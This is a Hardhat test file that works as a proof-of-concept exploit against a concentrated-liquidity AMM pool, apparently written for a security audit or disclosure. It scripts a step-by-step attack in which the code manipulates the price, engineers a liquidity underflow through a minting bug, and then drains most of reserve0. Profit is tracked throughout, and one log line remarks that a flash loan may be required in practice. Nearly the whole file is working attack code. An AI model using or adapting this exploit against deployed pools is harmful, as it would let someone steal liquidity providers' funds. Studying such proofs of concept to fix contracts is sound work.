import { BigNumber } from "@ethersproject/bignumber";
import { expect } from "chai";
import { ethers, network } from "hardhat";
import {
  approveToken,
  addLiquidityViaManager,
  getDx,
  getDy,
  getTickAtCurrentPrice,
  LinkedListHelper,
  getPriceAtTick,
} from "../harness/Concentrated";
import { getBigNumber } from "../harness/helpers";
import { Pangea } from "../harness/pangea";

const bn = (n) => {
  return BigNumber.from(n);
};

describe("Concentrated Liquidity Product Pool exploit", function () {
  let _snapshotId: string;
  let snapshotId: string;
  let pangea: Pangea;
  let defaultAddress: string;
  let pool;
  let immutables;

  let TICK_SPACING;

  const TWO_POW_96 = BigNumber.from(2).pow(96);

  const helper = new LinkedListHelper(-887272);

  before(async () => {
    _snapshotId = await ethers.provider.send("evm_snapshot", []);
    pangea = await Pangea.Instance.init();
    defaultAddress = pangea.accounts[0].address;
    snapshotId = await ethers.provider.send("evm_snapshot", []);
    pool = pangea.concentratedPools[0];
    immutables = await pool.getImmutables();
    TICK_SPACING = immutables._tickSpacing;
    await approveToken(
      immutables._token0,
      pangea.accounts[0],
      pangea.router.address,
      bn(2).pow(256).sub(1)
    );

    await approveToken(
      immutables._token1,
      pangea.accounts[0],
      pangea.router.address,
      bn(2).pow(256).sub(1)
    );
    await approveToken(
      immutables._token0,
      pangea.accounts[0],
      pangea.concentratedPoolManager.address,
      bn(2).pow(256).sub(1)
    );

    await approveToken(
      immutables._token1,
      pangea.accounts[0],
      pangea.concentratedPoolManager.address,
      bn(2).pow(256).sub(1)
    );
  });

  afterEach(async () => {
    await network.provider.send("evm_revert", [snapshotId]);
    snapshotId = await ethers.provider.send("evm_snapshot", []);
  });

  after(async () => {
    await network.provider.send("evm_revert", [_snapshotId]);
    _snapshotId = await ethers.provider.send("evm_snapshot", []);
  });

  describe("Exploit tests", async () => {
    /******************************** HELPER FUNCTIONS ************************************/

    interface SpendStats {
      token0: BigNumber;
      token1: BigNumber;
    }

    const showTicks = async (pool, detailed = false) => {
      // start a MIN_TICK
      const MIN_TICK = -887272;
      const MAX_TICK = 887272;
      let currentTick = await pool.ticks(MIN_TICK);

      if (!detailed) {
        let s: string = "MIN_TICK";
        while (currentTick.nextTick != MAX_TICK) {
          s = s.concat(`, ${currentTick.nextTick}`);
          currentTick = await pool.ticks(currentTick.nextTick);
        }
        const currentPriceTick = await getTickAtCurrentPrice(pool);
        console.log(`Current: ${currentPriceTick}. Ticks: ${s}, MAX_TICK`);
      } else {
        let currentTickNumber;
        console.log("Ticks {");
        console.log(`  current = ${await getTickAtCurrentPrice(pool)}`);
        do {
          currentTickNumber = currentTick.nextTick;
          currentTick = await pool.ticks(currentTick.nextTick);

          console.log(`  Tick ${currentTickNumber} {`);
          console.log(
            `    liquidity            = ${pp(currentTick.liquidity)}`
          );
          console.log(
            `    feeGrowthOutside0    = ${currentTick.feeGrowthOutside0}`
          );
          console.log(
            `    feeGrowthOutside1    = ${currentTick.feeGrowthOutside1}`
          );
          console.log(
            `    secondsGrowthOutside = ${currentTick.secondsGrowthOutside}`
          );
          console.log(`  }`);
        } while (currentTick.nextTick != MAX_TICK);
        console.log("}");
      }
    };

    const bn = (n) => {
      return BigNumber.from(n);
    };

    const addLiquidity = async (
      lower,
      upper,
      amount0,
      amount1,
      spendStats: SpendStats | undefined = undefined
    ) => {
      let addLiquidityParams = {
        pool: pool,
        amount0Desired: amount0,
        amount1Desired: amount1,
        native: false,
        lowerOld: helper.insert(lower),
        lower,
        upperOld: helper.insert(upper),
        upper,
        positionOwner: pangea.concentratedPoolManager.address,
        recipient: defaultAddress,
      };

      const result = await addLiquidityViaManager(addLiquidityParams);
      if (spendStats) {
        spendStats.token0 = spendStats.token0.add(result.dx);
        spendStats.token1 = spendStats.token1.add(result.dy);
      }
    };

    const pp = (n: BigNumber, decimals: number = 18): string => {
      return ethers.utils.formatUnits(n, decimals);
    };

    /*
     *  Sometimes it can be a little tricky to get this function to
     *  produce just the right token0/token1 amounts to get to the targetLiquidity.
     *  It will try to "perturb" the token0/token1 amounts
     */
    const getAmountsForLiquidity = async (
      lower: number,
      upper: number,
      targetLiquidity: BigNumber
    ) => {
      let perturbations = [
        { x: 0, y: 0, round: false },
        { x: 0, y: 0, round: true },
      ];

      let amounts;
      let roundTripLiquidity;
      let priceCurrent = (await pool.getPriceAndNearestTicks())._price;
      let priceLower = await pangea.tickMath.getSqrtRatioAtTick(lower);
      let priceUpper = await pangea.tickMath.getSqrtRatioAtTick(upper);

      let p;
      for (let i = 0; i < perturbations.length; i++) {
        p = perturbations[i];
        amounts = await pangea.dyDxMath.getAmountsForLiquidity(
          priceLower,
          priceUpper,
          priceCurrent,
          targetLiquidity,
          p.round
        );

        roundTripLiquidity = await pangea.dyDxMath.getLiquidityForAmounts(
          priceLower,
          priceUpper,
          priceCurrent,
          amounts.token1amount.add(p.y),
          amounts.token0amount.add(p.x)
        );

        if (roundTripLiquidity.eq(targetLiquidity)) {
          break;
          // } else {
          //   console.log(`FAIL: ${upper} ${p.x}/${p.y}/${p.round} ${roundTripLiquidity.toString()} != ${targetLiquidity.toString()}`);
        }
      }
      return {
        success: roundTripLiquidity.eq(targetLiquidity),
        token0Amount: amounts.token0amount.add(p.x),
        token1Amount: amounts.token1amount.add(p.y),
      };
    };

    /*
     *  Finds the smallest amount to add to 'liquidity' that is divisible by 2**pow_of_two evenly.
     *  Sometimes it will be divisible by 2**p where p > pow_of_two
     *
     * Example: smallestLiquidityToAdd(15, 2) will try to find the minimum amount to add to 15 so it is divisible by 2**2 == 4
     * It will return 1 but 15 + 1 == 16 and 16 is evenly divisible by 2**4.
     */
    const smallestLiquidityToAdd = (
      liquidity: BigNumber,
      pow_of_two: number
    ): BigNumber => {
      const divisor = BigNumber.from(2).pow(pow_of_two);
      if (liquidity.mod(divisor).eq(0)) {
        return liquidity;
      } else {
        return divisor.sub(liquidity.mod(divisor));
      }
    };

    const maxDivOf2 = (bn: BigNumber) => {
      let n = 0;
      while (bn.mod(2).eq(0)) {
        n += 1;
        bn = bn.div(2);
      }
      return n;
    };

    /* Given a number returns the exponent of the next power of 2 above or equal to it
     *
     *   n  | result
     * -----+-------
     *   7  |  3
     *   8  |  3
     *   15 |  4
     *   16 |  4
     *   17 |  5
     */
    const nextPowOf2 = (n: BigNumber) => {
      for (let i = 0; ; i++) {
        if (n.div(BigNumber.from(2).pow(i)).eq(0)) {
          return i;
        }
      }
    };

    const logPoolState = async () => {
      const reserves = await pool.getReserves();
      const liquidity = await pool.liquidity();
      const tanp = await pool.getPriceAndNearestTicks();
      const currentTick = await getTickAtCurrentPrice(pool);
      console.log("Pool {");
      console.log(`  liquidity   = ${pp(liquidity)}`);
      console.log(`  reserves0   = ${pp(reserves._reserve0)}`);
      console.log(`  reserves1   = ${pp(reserves._reserve1)}`);
      console.log(`  nearestTick = ${tanp._nearestTick}`);
      console.log(`  currentTick = ${currentTick}`);
      console.log(`  price       = ${await prettyPrice(tanp._price)};`);
      console.log("}");
    };

    const prettyPriceOfTick = async (tick) => {
      const price = await pangea.tickMath.getSqrtRatioAtTick(tick);
      return prettyPrice(price);
    };

    const getPriceE18 = (price) => {
      return price.pow(2).mul(bn(10).pow(18)).div(TWO_POW_96.pow(2));
    };

    const prettyPrice = (price) => {
      const DECIMALS = 4;
      const tenToDecimals = getPriceE18(price).div(bn(10).pow(18 - DECIMALS));
      return ethers.utils.formatUnits(tenToDecimals, DECIMALS);
    };

    const defaultSpendStats = (): SpendStats => {
      return { token0: bn(0), token1: bn(0) };
    };

    const swapForward = async (
      amount: BigNumber,
      spendStats: SpendStats | undefined = undefined
    ) => {
      const routerData = {
        tokenIn: immutables._token1,
        amountIn: amount,
        amountOutMinimum: bn(0),
        pool: pool.address,
        to: defaultAddress,
        unwrap: false,
      };

      const tokensReceived = await pangea.router.callStatic.exactInputSingle(
        routerData
      );
      await pangea.router.exactInputSingle(routerData);
      if (spendStats) {
        spendStats.token1 = spendStats.token1.add(amount);
        spendStats.token0 = spendStats.token0.sub(tokensReceived);
      }

      return tokensReceived;
    };

    const swapBackwards = async (amount: BigNumber, spendStats) => {
      const routerData = {
        tokenIn: immutables._token0,
        amountIn: amount,
        amountOutMinimum: 0,
        pool: pool.address,
        to: defaultAddress,
        unwrap: false,
      };

      const tokensReceived = await pangea.router.callStatic.exactInputSingle(
        routerData
      );
      if (spendStats) {
        spendStats.token0 = spendStats.token0.add(amount);
        spendStats.token1 = spendStats.token1.sub(tokensReceived);
      }
      await pangea.router.exactInputSingle(routerData);
      return tokensReceived;
    };

    const logTicks = async () => {
      console.log("Ticks {");
      console.log(
        "  nearestTick",
        (await pool.getPriceAndNearestTicks())._nearestTick
      );
      let tickAtPriceAfter = await getTickAtCurrentPrice(pool);
      console.log("  tickAtPrice", tickAtPriceAfter);
      console.log("}");
    };

    const logSpendStats = (spendStats, price) => {
      const priceE18 = getPriceE18(price);

      const signedToken1Equivalent = spendStats.token1
        .mul(bn(10).pow(18))
        .div(priceE18);
      console.log("SpendStats {");
      console.log(`  market price  = ${prettyPrice(price)}`);
      console.log(`  token0 = ${pp(spendStats.token0)}`);
      console.log(
        `  token1 = ${pp(spendStats.token1)} (${pp(
          signedToken1Equivalent
        )} in token0)`
      );

      const absToken1Equivalent = signedToken1Equivalent.gte(0)
        ? signedToken1Equivalent
        : signedToken1Equivalent.mul(-1);
      const absToken0 = spendStats.token0.gte(0)
        ? spendStats.token0
        : spendStats.token0.mul(-1);
      let r = absToken1Equivalent.gt(absToken0)
        ? { smaller: absToken0, larger: absToken1Equivalent }
        : { smaller: absToken1Equivalent, larger: absToken0 };
      const factor = BigNumber.from(10).pow(20); // 100e18
      const diff = r.larger.sub(r.smaller);

      if (spendStats.token0.add(signedToken1Equivalent).lt(0)) {
        let percent = r.larger.mul(factor).div(r.smaller).sub(factor);
        console.log(
          `  profit = ${pp(diff)} (${pp(percent.div(bn(10).pow(15)), 3)}%)`
        );
      } else {
        const percent = factor.sub(r.smaller.mul(factor).div(r.larger));
        console.log(
          `  loss   = ${pp(diff)} (${pp(percent.div(bn(10).pow(15)), 3)}%)`
        );
      }
      console.log(
        "  (positive numbers represent spending, negative numbers represent return)"
      );
    };

    const calcPrice = (
      price,
      liquidity,
      token1Balance,
      reserve1,
      amount: BigNumber
    ) => {
      const inAmount = amount.add(token1Balance.sub(reserve1));
      return price.add(inAmount.mul(TWO_POW_96).div(liquidity));
    };

    const findSwapAmountToGetSpecialPairWithNextTick = async (
      powOfTwo,
      logPowOfTwo
    ) => {
      let initialPrice = (await pool.getPriceAndNearestTicks())._price;
      let currentTick = await pangea.tickMath.getTickAtSqrtRatio(initialPrice);
      const nearestTick = currentTick - (currentTick % TICK_SPACING);
      const nextEvenTick =
        nearestTick +
        TICK_SPACING * (nearestTick % (2 * TICK_SPACING) == 0 ? 2 : 1);

      const nextPrice = await pangea.tickMath.getSqrtRatioAtTick(nextEvenTick);
      console.log(
        `--- Finding amount to swap between tick ${currentTick} and even tick ${nextEvenTick} ---`
      );
      console.log(`starting price: ${initialPrice}`);

      const liquidity = await pool.liquidity();
      const token1Balance = (
        await pangea.getTokenBalance([immutables._token1], pool.address)
      )[0];
      const reserve1 = (await pool.getReserves())._reserve1;

      const nextPow2 = nextPowOf2(nextPrice.sub(initialPrice));
      if (powOfTwo >= nextPow2) {
        throw new Error(`threshold must be < ${nextPow2}`);
      }

      let startTime = new Date().getTime();
      const calcSecondsWithMillis = (lastTime) => {
        let t = new Date().getTime();
        const result = Math.round(t - lastTime) / 1000;
        lastTime = t;
        return result;
      };
      let foundCount = 0;
      const calcAverageTime = () => {
        let t = new Date().getTime();
        return Math.round((t - startTime) / foundCount) / 1000;
      };

      let lastTime = startTime;
      for (let amount: BigNumber = bn(1); ; amount = amount.add(1)) {
        let price = calcPrice(
          initialPrice,
          liquidity,
          token1Balance,
          reserve1,
          amount
        );
        let diff = nextPrice.sub(price);
        let maxDiv = maxDivOf2(diff);
        if (logPowOfTwo && maxDiv >= logPowOfTwo) {
          foundCount++;
          const averageTimeToFind = calcAverageTime();
          console.log(
            `amount = ${amount} maxDiv = ${maxDiv} diff = ${diff.toHexString()} t = ${calcSecondsWithMillis(
              lastTime
            )} avg = ${averageTimeToFind}`
          );
          lastTime = new Date().getTime();
        }
        if (maxDiv >= powOfTwo) {
          console.log(`Total time: ${calcSecondsWithMillis(startTime)}`);
          return {
            success: true,
            amount: amount,
            maxDiv: maxDiv,
            price: price,
            liquidityToAdd: smallestLiquidityToAdd(liquidity, 96 - maxDiv),
          };
        }
      }
      return {
        success: false,
        amount: bn(0),
        maxDiv: 0,
        price: bn(0),
        liquidityToAdd: bn(0),
      };
    };

    const logXwing = () => {
      console.log(`.-.__        .-.  ___ `);
      console.log(`|_|  '--.-.-(   \\/\\;;\\_ .-._______.-. `);
      console.log(`(-)___     \\ \\ .-\\ \\;;\\(   \\       \\ \\ `);
      console.log(` Y    '---._\\_((Q)) \\;;\\\\ .-\\     __(_) `);
      console.log(` I           __'-' / .--.((Q))---'    \\, `);
      console.log(` I     ___.-:    \\|  |   \\'-'_          \\ `);
      console.log(` A  .-'      \\ .-.\\   \\   \\ \\ '--.__     '\\ `);
      console.log(` |  |____.----((Q))\\   \\__|--\\_      \\     ' `);
      console.log(`    ( )        '-'  \\_  :  \\-' '--.___\\ `);
      console.log(`     Y                \\  \\  \\       \\(_) `);
      console.log(`     I                 \\  \\  \\         \\, `);
      console.log(`     I                  \\  \\  \\          \\ `);
      console.log(`     A                   \\  \\  \\          '\\ `);
      console.log(`     |                    \\  \\__|           ' `);
      console.log(`                           \\_:.  \\ `);
      console.log(`                             \\ \\  \\ `);
      console.log(`                              \\ \\  \\ `);
      console.log(`                               \\_\\_| `);
      console.log(`\n\n`);
      console.log(`      *** SETTING UP FOR OUR ATTACK RUN ***`);
      console.log(`\n\n`);
    };

    /*
     *  A function to add substantial "background" liquidity from lower to upper.
     */
    const addBackgroundLiquidity = async (lower, upper, amount: BigNumber) => {
      if (lower % (2 * TICK_SPACING) != 0 || upper % (2 * TICK_SPACING) == 0) {
        throw new Error("lower is odd or upper is even");
      }
      await addLiquidity(lower, upper, amount, amount);
    };

    const getNextTick = async (pool) => {
      const nearestTick = (await pool.getPriceAndNearestTicks())._nearestTick;
      const t = await pool.ticks(nearestTick);
      return t.nextTick;
    };

    const getPrevTick = async (pool) => {
      return (await pool.getPriceAndNearestTicks())._nearestTick;
    };

    const swapForwardToTargetTick = async (
      targetTick,
      spendStats: SpendStats | undefined = undefined
    ) => {
      // we want to increase the price to equal that of startTick. This may require crossing ticks.
      let currentTick = await getTickAtCurrentPrice(pool);
      while (currentTick != targetTick) {
        const currentPrice = (await pool.getPriceAndNearestTicks())._price;
        const nextTick = await getNextTick(pool);
        let nextPrice;
        if (nextTick < targetTick) {
          nextPrice = await pangea.tickMath.getSqrtRatioAtTick(nextTick);
        } else {
          nextPrice = await pangea.tickMath.getSqrtRatioAtTick(targetTick);
        }
        const dy = await getDy(
          await pool.liquidity(),
          currentPrice,
          nextPrice,
          false
        );
        await swapForward(dy.add(1), spendStats); // add one to cross tick if crossing tick
        currentTick = await getTickAtCurrentPrice(pool);
      }
    };

    const swapBackwardToTargetTick = async (
      targetTick,
      spendStats: SpendStats | undefined = undefined
    ) => {
      // we want to increase the price to equal that of startTick. This may require crossing ticks.
      let currentTick = await getTickAtCurrentPrice(pool);
      while (currentTick != targetTick) {
        const currentPrice = (await pool.getPriceAndNearestTicks())._price;
        const prevTick = await getPrevTick(pool);
        console.log(
          `Swapping backwards from ${currentTick} to ${
            prevTick < targetTick ? targetTick : prevTick
          }`
        );
        let nextPrice;
        if (prevTick > targetTick) {
          nextPrice = await pangea.tickMath.getSqrtRatioAtTick(prevTick);
        } else {
          nextPrice = await pangea.tickMath.getSqrtRatioAtTick(targetTick);
        }
        const dx = await getDx(
          await pool.liquidity(),
          nextPrice,
          currentPrice,
          false
        );
        if (prevTick < targetTick) {
          await swapBackwards(dx, spendStats); // don't cross the tick
        } else {
          await swapBackwards(dx.add(1), spendStats); // cross the tick
        }

        currentTick = await getTickAtCurrentPrice(pool);
      }
    };
    [];

    /*
     *
     * Execute the hack with profiteering. Finds a "special pair"
     * and then adds liquidity to the current tick range.
     *
     * - 'startTick' is tick to start at
     * - 'powOfTwo' is the power of two you want the special pair to be divisible by
     * - 'spendStats' is a data structure to (optionally) keep track of how much was spent by the attacker.
     * - will add liquidity at next even tick and cause liquidity underflow
     * - will then swap back for as much as the reserve will allow to make a profit. It's more profitable the higher the tick.
     */
    const profiteeringHack = async (
      backgroundLiquidityAmount: BigNumber,
      exchangeStartTick,
      startTick0,
      powOfTwo,
      spendStats: SpendStats | undefined = undefined
    ) => {
      //
      // SETUP
      //
      logXwing();
      const UNDERFLOW_BY = bn(10_000); // this doesn't have to be a big number

      const LARGE = 880000;
      const lower = -(LARGE - (LARGE % (2 * TICK_SPACING)));
      const upper = LARGE - (LARGE % (2 * TICK_SPACING)) + TICK_SPACING;
      await addBackgroundLiquidity(
        lower,
        upper,
        backgroundLiquidityAmount.div(2)
      );
      await swapForwardToTargetTick(exchangeStartTick);

      // Randomly add liquidity around the current tick. Start narrow and move out
      const NUM_RANDOM_LIQUIDITY_BANDS = 10;

      console.log(
        "====================== Setting up system in initial state ======================="
      );
      console.log(`Starting tick: ${exchangeStartTick}`);
      let pairs: string[] = [];
      for (let i = 0; i < NUM_RANDOM_LIQUIDITY_BANDS; i++) {
        let nearestEvenTick =
          exchangeStartTick - (exchangeStartTick % (2 * TICK_SPACING));
        nearestEvenTick =
          nearestEvenTick % (2 * TICK_SPACING) == 0
            ? nearestEvenTick
            : nearestEvenTick - TICK_SPACING;
        const nearestOddTick = nearestEvenTick + 3 * TICK_SPACING;
        let lower;
        let upper;
        do {
          lower =
            nearestEvenTick - Math.round(Math.random() * i) * 2 * TICK_SPACING;
          upper =
            nearestOddTick + Math.round(Math.random() * i) * 2 * TICK_SPACING;
        } while (pairs.includes(`${lower},${upper}`));
        pairs.push(`${lower},${upper}`);
        console.log(
          `Adding random background liquidity in range (${lower} , ${upper})`
        );
        await addBackgroundLiquidity(
          lower,
          upper,
          backgroundLiquidityAmount.div(NUM_RANDOM_LIQUIDITY_BANDS)
        );
      }
      //
      // Setup is now finished. Now to simulate an exploit.
      //
      console.log(
        "================================================================================="
      );
      console.log("--- Initial state of the exchange --- ");
      await showTicks(pool);
      const marketPrice = (await pool.getPriceAndNearestTicks())._price;
      console.log(
        `--- marketPrice = ${prettyPrice(
          marketPrice
        )} (tick = ${exchangeStartTick}) ---`
      );

      console.log(
        `--- Manipulate the price down from tick ${exchangeStartTick} (${await prettyPriceOfTick(
          exchangeStartTick
        )}) to ${startTick0} (${await prettyPriceOfTick(startTick0)})`
      );

      await swapBackwardToTargetTick(startTick0, spendStats);

      let startTick = startTick0 - (startTick0 % TICK_SPACING);

      const isEven = startTick % (2 * TICK_SPACING) == 0;
      const nextEvenTick = startTick + TICK_SPACING * (isEven ? 2 : 1);

      // Now swap forward in very small increments until we get a special pair for the current price
      const amountToSwap = await findSwapAmountToGetSpecialPairWithNextTick(
        powOfTwo,
        powOfTwo - 4
      );
      if (!amountToSwap.success) {
        throw new Error("Couldn't find special pair");
      }

      const lowerForAdd = isEven ? startTick : startTick - TICK_SPACING;
      let upperForAdd = nextEvenTick + TICK_SPACING;

      //
      // STEP 1: Swap forward until we reach a price that makes a special pair with price at next tick
      //
      await swapForward(amountToSwap.amount, spendStats);
      const nextPrice = await pangea.tickMath.getSqrtRatioAtTick(nextEvenTick);

      //
      // STEP 2: Add liquidity until it's the right power of 2
      //
      let amounts = await getAmountsForLiquidity(
        lowerForAdd,
        upperForAdd,
        amountToSwap.liquidityToAdd
      );
      while (!amounts.success) {
        upperForAdd += 2 * TICK_SPACING;
        amounts = await getAmountsForLiquidity(
          lowerForAdd,
          upperForAdd,
          amountToSwap.liquidityToAdd
        );
      }

      await addLiquidity(
        lowerForAdd,
        upperForAdd,
        amounts.token0Amount,
        amounts.token1Amount,
        spendStats
      );

      const liquidityToExceed = await pool.liquidity();
      const liquidityOfNextEvenTick = (await pool.ticks(nextEvenTick))
        .liquidity;

      //
      // STEP 3: Add enough liquidity that it will cause an underflow
      //
      let amountsToCauseUnderflow = await getAmountsForLiquidity(
        nextEvenTick,
        nextEvenTick + TICK_SPACING,
        liquidityToExceed.sub(liquidityOfNextEvenTick).add(UNDERFLOW_BY)
      ); // Doesn't matter if this isn't exact
      console.log(
        `Adding ${pp(
          amountsToCauseUnderflow.token0Amount
        )} token0 to ticks (${nextEvenTick} , ${
          nextEvenTick + TICK_SPACING
        }) to cause underflow`
      );
      await addLiquidity(
        nextEvenTick,
        nextEvenTick + TICK_SPACING,
        amountsToCauseUnderflow.token0Amount,
        amountsToCauseUnderflow.token1Amount,
        spendStats
      );

      // STEP 4: Swap forward until you're sitting right on the next tick
      const dy = await getDy(
        await pool.liquidity(),
        (
          await pool.getPriceAndNearestTicks()
        )._price,
        nextPrice,
        false
      );
      await swapForward(dy, spendStats);
      console.log(
        "--- After step 4 nearestTick < tickAtPrice even though\n--- tickAtPrice sits on tick boundary! *** This is VERY bad *** "
      );
      // Cancel attack if this isn't true. Should always be true.
      expect(
        (await pool.getPriceAndNearestTicks())._nearestTick + 2 * TICK_SPACING
      ).to.equal(await getTickAtCurrentPrice(pool));

      await logTicks();
      await logPoolState();

      //
      // STEP 5: Now call mint to cause the "no adding liquidity" bug. Add as little as you can.
      //
      await addLiquidity(
        nextEvenTick,
        nextEvenTick + TICK_SPACING,
        bn(1),
        getBigNumber(0),
        spendStats
      );
      console.log(
        `--- After minting in range (${nextEvenTick},${
          nextEvenTick + TICK_SPACING
        }) we have nearestTick == tickAtPrice but liquidity has not changed! ---`
      );
      await logTicks();
      await logPoolState();
      //
      // STEP 6: Now swap forward again to get underflow
      //
      const newCurrentPrice = (await pool.getPriceAndNearestTicks())._price;
      const dyToCrossNext = await getDy(
        await pool.liquidity(),
        newCurrentPrice,
        await pangea.tickMath.getSqrtRatioAtTick(nextEvenTick + TICK_SPACING),
        true
      );
      await swapForward(dyToCrossNext, spendStats);
      console.log("--- After liquidity underflow ---");
      await logPoolState();

      console.log(
        '--- This is how much of token0/token1 have been "spent" to make this happen ---'
      );
      console.log(
        "--- (A flash loan may be required to make this happen in practice) ---"
      );
      logSpendStats(spendStats, marketPrice);

      console.log(
        "--- Now swap forwards (one-for-zero) draining reserve0 --- "
      );

      const priceAndNearestTick2 = await pool.getPriceAndNearestTicks();
      const upperTick2 = await getNextTick(pool);
      const priceLower2 = await getPriceAtTick(
        priceAndNearestTick2._nearestTick
      );
      const priceUpper2 = await getPriceAtTick(upperTick2);
      const reserves2 = await pool.getReserves();
      const realLiquidity = await pangea.dyDxMath.getLiquidityForAmounts(
        priceLower2,
        priceUpper2,
        priceAndNearestTick2._price,
        reserves2._reserve1,
        reserves2._reserve0
      );
      console.log(`realLiquidity = ${pp(realLiquidity)}`);
      const amountToSwapToDrain = await getDy(
        realLiquidity,
        priceLower2,
        priceUpper2,
        false
      );
      console.log(`amountToSwapToDrain = ${pp(amountToSwapToDrain)}`);
      await swapForward(amountToSwapToDrain.mul(8500).div(10000), spendStats);
      await logPoolState();
      logSpendStats(spendStats, marketPrice);
    };

    /*********************************************************************************************/

    it("Randomly set up and hack the exchange", async () => {
      let spendStats = defaultSpendStats();

      const powOfTwo = 20;
      let exchangeStartTick = Math.round(Math.random() * 10000) + 10000;
      let startTick = Math.round(Math.random() * (exchangeStartTick / 2));
      await profiteeringHack(
        getBigNumber(1_000_000),
        exchangeStartTick,
        startTick,
        powOfTwo,
        spendStats
      );
    });
  });
});
